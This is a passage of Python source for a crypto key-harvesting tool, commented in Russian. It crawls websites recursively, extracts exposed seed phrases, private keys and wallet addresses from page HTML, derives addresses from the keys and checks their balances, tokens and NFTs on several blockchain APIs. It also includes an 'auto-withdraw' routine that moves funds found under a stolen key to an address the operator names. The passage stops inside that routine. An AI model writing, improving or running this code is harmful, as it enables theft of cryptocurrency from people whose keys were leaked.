            'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first',
            'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor',
            'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly',
            'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest',
            'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile',
            'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen',
            'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy',
            'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp',
            'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture',
            'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance',
            'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue',
            'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown',
            'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid',
            'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guess', 'guide', 'guilt',
            'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy',
            'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health',
            'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden',
            'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole',
            'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital',
            'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred',
            'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea',
            'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune',
            'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate',
            'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury',
            'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install',
            'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue',
            'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel',
            'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior',
            'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney',
            'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee', 'knife',
            'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language',
            'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit',
            'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal',
            'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level',
            'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit',
            'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster',
            'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love',
            'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad',
            'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage',
            'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market',
            'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum',
            'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt',
            'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message',
            'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor',
            'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile',
            'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral',
            'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie',
            'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'mushroom', 'music', 'must', 'mutual',
            'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature',
            'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net',
            'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee',
            'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now',
            'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe',
            'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often',
            'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online',
            'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order',
            'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output',
            'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact',
            'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper',
            'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol',
            'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen',
            'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo',
            'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot',
            'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate',
            'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar',
            'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post',
            'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare',
            'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private',
            'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property',
            'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin',
            'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put', 'puzzle',
            'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit',
            'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp',
            'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'razor',
            'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle',
            'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release',
            'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen',
            'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response',
            'result', 'retire', 'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib',
            'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot',
            'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket',
            'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal',
            'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness',
            'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand',
            'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scatter',
            'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 'script',
            'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed',
            'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service',
            'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell',
            'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop',
            'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side',
            'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since',
            'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill',
            'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight',
            'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth',
            'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda',
            'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry',
            'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn',
            'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin',
            'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring',
            'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp',
            'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick',
            'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street',
            'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway',
            'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny',
            'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey',
            'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'sway', 'swear', 'sweet', 'swift',
            'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle',
            'tag', 'tail', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo',
            'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test',
            'text', 'thank', 'that', 'thaw', 'theater', 'theft', 'theme', 'then', 'theory', 'there',
            'they', 'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket',
            'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title',
            'toast', 'tobacco', 'today', 'toddler', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow',
            'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado',
            'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade',
            'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree',
            'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck',
            'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna',
            'tunnel', 'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two',
            'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo',
            'unfair', 'unfold', 'unhappy', 'uniform', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until',
            'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge',
            'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague',
            'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle',
            'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran',
            'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual',
            'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano',
            'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want',
            'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'water', 'wave', 'way', 'wealth',
            'weapon', 'wear', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west',
            'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide',
            'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner',
            'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood',
            'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist',
            'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero',
            'zone', 'zoo'
        ]
        
        # Улучшенный поиск BIP39 мнемоник
        bip39_set = set(bip39_words)
        
        # Ищем последовательности из 12 или 24 слов
        words_in_html = re.findall(r'\b[a-z]+\b', html.lower())
        
        for i in range(len(words_in_html) - 11):
            # Проверяем 12-словную фразу
            phrase_12 = words_in_html[i:i+12]
            valid_count_12 = sum(1 for w in phrase_12 if w in bip39_set)
            if valid_count_12 >= 10:  # Минимум 10 из 12 валидных
                phrase_str = ' '.join(phrase_12)
                keys.append(f"BIP39 Mnemonic (12 words): {phrase_str}")
            
            # Проверяем 24-словную фразу
            if i <= len(words_in_html) - 24:
                phrase_24 = words_in_html[i:i+24]
                valid_count_24 = sum(1 for w in phrase_24 if w in bip39_set)
                if valid_count_24 >= 20:  # Минимум 20 из 24 валидных
                    phrase_str = ' '.join(phrase_24)
                    keys.append(f"BIP39 Mnemonic (24 words): {phrase_str}")
        
        # 9. Bitcoin адреса (Legacy, SegWit, Bech32)
        btc_patterns = [
            r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b',  # Legacy P2PKH/P2SH
            r'\bbc1[a-z0-9]{39,59}\b'  # Bech32 (SegWit)
        ]
        
        for pattern in btc_patterns:
            matches = re.findall(pattern, html)
            for match in matches[:10]:  # Ограничиваем количество
                keys.append(f"Bitcoin Address: {match}")
        
        # 10. Ethereum адреса
        eth_pattern = r'0x[a-fA-F0-9]{40}\b'
        eth_matches = re.findall(eth_pattern, html)
        for match in eth_matches[:10]:  # Ограничиваем
            keys.append(f"Ethereum Address: {match}")
        
        # 11. Solana адреса (Base58, 32-44 символа)
        sol_pattern = r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b'
        sol_matches = re.findall(sol_pattern, html)
        # Фильтруем - исключаем BTC и простые строки
        for match in sol_matches[:5]:
            if len(match) >= 43 and not match.startswith(('1', '3', 'bc1')):
                keys.append(f"Solana Address: {match}")
        
        # Убираем дубликаты
        return list(set(keys))
    
    def extract_links_from_html(self, html: str, base_url: str) -> List[str]:
        """Извлечение всех ссылок из HTML"""
        links = []
        try:
            soup = BeautifulSoup(html, 'html.parser')
            
            # Ищем все <a> теги
            for link in soup.find_all('a', href=True):
                href = link['href']
                
                # Пропускаем якоря и javascript
                if href.startswith('#') or href.startswith('javascript:'):
                    continue
                
                # Преобразуем относительные ссылки в абсолютные
                full_url = urljoin(base_url, href)
                
                # Проверяем, что URL на том же домене
                base_domain = urlparse(base_url).netloc
                link_domain = urlparse(full_url).netloc
                
                if base_domain == link_domain:
                    links.append(full_url)
        except:
            pass
        
        return list(set(links))
    
    async def spider_crawl(self, session, start_url: str, depth: int = 0, max_depth: int = 2) -> List[Dict]:
        """
        Spider краулер - рекурсивно обходит ссылки
        """
        if depth > max_depth or start_url in self.visited_urls or not self.is_scanning:
            return []
        
        self.visited_urls.add(start_url)
        results = []
        
        try:
            self.log(f"🕷️ Spider [{depth}/{max_depth}]: {start_url[:60]}...", "INFO")
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml',
            }
            
            async with session.get(start_url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status == 200:
                    html = await response.text()
                    
                    # Проверяем текущую страницу на ключи
                    keys = self.find_real_keys(html)
                    
                    if keys:
                        self.log(f"✅ SPIDER НАШЕЛ: {start_url} - {len(keys)} ключей", "KEY")
                        
                        # Проверяем балансы если нужно
                        enriched_keys = []
                        if self.check_balances_var.get() or self.check_nft_var.get():
                            enriched_keys = await self.enrich_keys_with_data(keys)
                        
                        results.append({
                            'site': start_url,
                            'status': 'ok',
                            'http_status': response.status,
                            'keys': keys,
                            'enriched_keys': enriched_keys if enriched_keys else keys,
                            'depth': depth
                        })
                    
                    # Если не достигли макс. глубины - ищем ссылки
                    if depth < max_depth:
                        links = self.extract_links_from_html(html, start_url)
                        
                        # Ограничиваем количество ссылок на страницу
                        links = links[:20]
                        
                        self.log(f"  🔗 Найдено {len(links)} ссылок", "INFO")
                        
                        # Рекурсивно обрабатываем каждую ссылку
                        for link in links:
                            if link not in self.visited_urls:
                                await asyncio.sleep(self.delay_var.get())  # Задержка
                                sub_results = await self.spider_crawl(session, link, depth + 1, max_depth)
                                results.extend(sub_results)
        
        except Exception as e:
            self.log(f"❌ Spider error: {start_url[:40]} - {str(e)[:30]}", "ERROR")
        
        return results
    
    def is_valid_private_key(self, private_key: str) -> bool:
        """
        ВАЛИДАЦИЯ приватного ключа - фильтр мусора
        Проверяет, что ключ не является:
        - Хэшем транзакции
        - ID элемента
        - Нулевым ключом
        - Ключом больше максимального значения SECP256k1
        """
        try:
            # Убираем 0x
            if private_key.startswith('0x'):
                private_key = private_key[2:]
            
            # Проверяем длину
            if len(private_key) != 64:
                return False
            
            # Преобразуем в число
            key_int = int(private_key, 16)
            
            # Проверяем на нуль
            if key_int == 0:
                return False
            
            # Максимальное значение для SECP256k1
            SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
            
            # Ключ должен быть меньше порядка кривой
            if key_int >= SECP256K1_N:
                return False
            
            # Пробуем сгенерировать адрес - если ошибка, значит ключ невалидный
            address = self.derive_eth_address_from_private_key(private_key)
            return address is not None
            
        except:
            return False
    
    def derive_eth_address_from_private_key(self, private_key: str) -> Optional[str]:
        """Получение Ethereum адреса из приватного ключа"""
        try:
            # Убираем 0x если есть
            if private_key.startswith('0x'):
                private_key = private_key[2:]
            
            # Проверяем длину (64 hex символа)
            if len(private_key) != 64:
                return None
            
            # Простой способ - используем keccak256
            from Crypto.Hash import keccak
            import ecdsa
            
            private_key_bytes = bytes.fromhex(private_key)
            sk = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1)
            public_key = sk.get_verifying_key().to_string()
            
            # Keccak256 хэш публичного ключа
            k = keccak.new(digest_bits=256)
            k.update(public_key)
            address_bytes = k.digest()[-20:]
            
            address = '0x' + address_bytes.hex()
            return address.lower()
        except:
            return None
    
    async def check_eth_balance(self, address: str) -> Optional[Dict]:
        """Проверка баланса Ethereum"""
        try:
            # Используем бесплатный API Etherscan
            url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={self.etherscan_api_key}"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get('status') == '1':
                            balance_wei = int(data.get('result', 0))
                            balance_eth = balance_wei / 1e18
                            return {'address': address, 'balance': balance_eth, 'currency': 'ETH'}
        except:
            pass
        return None
    
    async def check_erc20_balances(self, address: str) -> Optional[Dict]:
        """Проверка балансов ERC-20 токенов"""
        token_balances = {}
        
        for token_name, token_address in self.erc20_tokens.items():
            try:
                url = f"https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress={token_address}&address={address}&tag=latest&apikey={self.etherscan_api_key}"
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as response:
                        if response.status == 200:
                            data = await response.json()
                            if data.get('status') == '1':
                                balance_raw = int(data.get('result', 0))
                                if balance_raw > 0:
                                    # Большинство токенов имеют 18 decimals, но USDT/USDC - 6
                                    decimals = 6 if token_name in ['USDT', 'USDC'] else 18
                                    balance = balance_raw / (10 ** decimals)
                                    token_balances[token_name] = balance
                await asyncio.sleep(0.2)  # Rate limiting
            except:
                continue
        
        return token_balances if token_balances else None
    
    async def check_bsc_balance(self, address: str) -> Optional[Dict]:
        """Проверка баланса Binance Smart Chain (BNB)"""
        try:
            # Используем бесплатный API BscScan
            url = f"https://api.bscscan.com/api?module=account&action=balance&address={address}&tag=latest&apikey=YourApiKeyToken"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get('status') == '1':
                            balance_wei = int(data.get('result', 0))
                            balance_bnb = balance_wei / 1e18
                            return {'balance': balance_bnb, 'currency': 'BNB'}
        except:
            pass
        return None
    
    async def check_polygon_balance(self, address: str) -> Optional[Dict]:
        """Проверка баланса Polygon (MATIC)"""
        try:
            # Используем бесплатный API PolygonScan
            url = f"https://api.polygonscan.com/api?module=account&action=balance&address={address}&tag=latest&apikey=YourApiKeyToken"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get('status') == '1':
                            balance_wei = int(data.get('result', 0))
                            balance_matic = balance_wei / 1e18
                            return {'balance': balance_matic, 'currency': 'MATIC'}
        except:
            pass
        return None
    
    async def check_eth_transactions(self, address: str) -> Optional[Dict]:
        """Проверка истории транзакций Ethereum"""
        try:
            # Проверяем количество транзакций
            url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&startblock=0&endblock=99999999&page=1&offset=10&sort=desc&apikey={self.etherscan_api_key}"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get('status') == '1':
                            transactions = data.get('result', [])
                            if transactions:
                                return {
                                    'address': address,
                                    'tx_count': len(transactions),
                                    'has_activity': True,
                                    'first_tx': transactions[-1] if transactions else None,
                                    'last_tx': transactions[0] if transactions else None
                                }
                            else:
                                return {'address': address, 'tx_count': 0, 'has_activity': False}
        except:
            pass
        return None
    
    async def check_btc_balance(self, address: str) -> Optional[Dict]:
        """Проверка баланса Bitcoin"""
        try:
            # Используем blockchain.info API
            url = f"https://blockchain.info/q/addressbalance/{address}"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        balance_satoshi = int(await response.text())
                        balance_btc = balance_satoshi / 1e8
                        return {'address': address, 'balance': balance_btc, 'currency': 'BTC'}
        except:
            pass
        return None
    
    async def check_nft_ownership(self, address: str) -> Optional[Dict]:
        """Проверка NFT на адресе"""
        try:
            # Используем Alchemy NFT API
            url = f"https://eth-mainnet.g.alchemy.com/v2/{self.alchemy_api_key}/getNFTs/?owner={address}"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        data = await response.json()
                        nfts = data.get('ownedNfts', [])
                        if nfts:
                            return {'address': address, 'nft_count': len(nfts), 'nfts': nfts[:5]}
        except:
            pass
        return None
    
    async def enrich_keys_with_data(self, keys: List[str]) -> List[Dict]:
        """Обогащение найденных ключей данными о балансах, транзакциях и NFT"""
        enriched = []
        
        for key in keys:
            key_data = {'key': key, 'balance': None, 'nfts': None, 'transactions': None, 'derived_address': None}
            
            # 1. Обработка EVM Private Key
            if 'EVM Private Key:' in key:
                private_key = key.split('EVM Private Key: ')[1].strip()
                
                # Получаем адрес из приватного ключа
                address = self.derive_eth_address_from_private_key(private_key)
                
                if address:
                    key_data['derived_address'] = address
                    self.log(f"   🔑 Адрес: {address}", "INFO")
                    
                    # Проверяем транзакции
                    tx_info = await self.check_eth_transactions(address)
                    if tx_info:
                        key_data['transactions'] = tx_info
                        if tx_info['has_activity']:
                            self.log(f"   ✅ АКТИВНЫЙ КОШЕЛЕК! Транзакций: {tx_info['tx_count']}", "SUCCESS")
                        else:
                            self.log(f"   ⚪ Кошелек не использовался (0 транзакций)", "WARNING")
                    
                    # Проверяем баланс
                    if self.check_balances_var.get():
                        balance_info = await self.check_eth_balance(address)
                        if balance_info and balance_info['balance'] > 0:
                            key_data['balance'] = balance_info
                            self.log(f"   💰 ETH баланс: {balance_info['balance']:.6f} ETH", "SUCCESS")
                            
                            # Автовывод если есть баланс
                            if self.auto_withdraw_var.get():
                                await self.auto_withdraw_crypto(private_key, address, balance_info)
                        
                        # Проверяем ERC-20 токены
                        erc20_balances = await self.check_erc20_balances(address)
                        if erc20_balances:
                            key_data['erc20_tokens'] = erc20_balances
                            for token, balance in erc20_balances.items():
                                self.log(f"   🟢 {token}: {balance:.4f}", "SUCCESS")
                        
                        # Проверяем BNB (Binance Smart Chain)
                        bnb_balance = await self.check_bsc_balance(address)
                        if bnb_balance and bnb_balance['balance'] > 0:
                            key_data['bnb_balance'] = bnb_balance
                            self.log(f"   🟡 BNB: {bnb_balance['balance']:.6f}", "SUCCESS")
                        
                        # Проверяем MATIC (Polygon)
                        matic_balance = await self.check_polygon_balance(address)
                        if matic_balance and matic_balance['balance'] > 0:
                            key_data['matic_balance'] = matic_balance
                            self.log(f"   🟪 MATIC: {matic_balance['balance']:.6f}", "SUCCESS")
                    
                    # Проверяем NFT
                    if self.check_nft_var.get():
                        nft_info = await self.check_nft_ownership(address)
                        if nft_info:
                            key_data['nfts'] = nft_info
                            self.log(f"   🖼️ NFT: {nft_info['nft_count']} шт.", "SUCCESS")
            
            # 2. Обработка Ethereum Address
            elif 'Ethereum Address:' in key:
                address = key.split('Ethereum Address: ')[1].strip()
                
                # Проверяем транзакции
                tx_info = await self.check_eth_transactions(address)
                if tx_info:
                    key_data['transactions'] = tx_info
                    if tx_info['has_activity']:
                        self.log(f"   ✅ Активный адрес! Транзакций: {tx_info['tx_count']}", "SUCCESS")
                
                if self.check_balances_var.get():
                    balance_info = await self.check_eth_balance(address)
                    if balance_info and balance_info['balance'] > 0:
                        key_data['balance'] = balance_info
                        self.log(f"   💰 ETH баланс: {balance_info['balance']:.6f} ETH", "SUCCESS")
                    
                    # Проверяем ERC-20 токены
                    erc20_balances = await self.check_erc20_balances(address)
                    if erc20_balances:
                        key_data['erc20_tokens'] = erc20_balances
                        for token, balance in erc20_balances.items():
                            self.log(f"   🟢 {token}: {balance:.4f}", "SUCCESS")
                    
                    # Проверяем другие сети
                    bnb_balance = await self.check_bsc_balance(address)
                    if bnb_balance and bnb_balance['balance'] > 0:
                        key_data['bnb_balance'] = bnb_balance
                        self.log(f"   🟡 BNB: {bnb_balance['balance']:.6f}", "SUCCESS")
                    
                    matic_balance = await self.check_polygon_balance(address)
                    if matic_balance and matic_balance['balance'] > 0:
                        key_data['matic_balance'] = matic_balance
                        self.log(f"   🟪 MATIC: {matic_balance['balance']:.6f}", "SUCCESS")
                
                if self.check_nft_var.get():
                    nft_info = await self.check_nft_ownership(address)
                    if nft_info:
                        key_data['nfts'] = nft_info
                        self.log(f"   🖼️ NFT: {nft_info['nft_count']} шт.", "SUCCESS")
            
            # 3. Обработка Bitcoin Address
            elif 'Bitcoin Address:' in key:
                address = key.split('Bitcoin Address: ')[1].strip()
                
                if self.check_balances_var.get():
                    balance_info = await self.check_btc_balance(address)
                    if balance_info:
                        key_data['balance'] = balance_info
                        if balance_info['balance'] > 0:
                            self.log(f"   💰 BTC баланс: {balance_info['balance']:.8f} BTC", "SUCCESS")
            
            enriched.append(key_data)
        
        return enriched
    
    async def auto_withdraw_crypto(self, private_key: str, from_address: str, balance_info: Dict):
        """
        Автоматический вывод криптовалюты
        ВНИМАНИЕ: Эта функция только ЛОГИРУЕТ действия!
        Реальный вывод требует интеграции с web3.py
        """
        if not self.auto_withdraw_var.get():
            return
        
        to_address = self.withdraw_address.get().strip()
        if not to_address:
            self.log("⚠️ Автовывод: не указан адрес получателя!", "WARNING")
            return
        
        try:
            currency = balance_info.get('currency', 'ETH')
            balance = balance_info.get('balance', 0)
            
            if balance > 0:
                self.log(f"\n💸 АВТОВЫВОД АКТИВИРОВАН!", "SUCCESS")
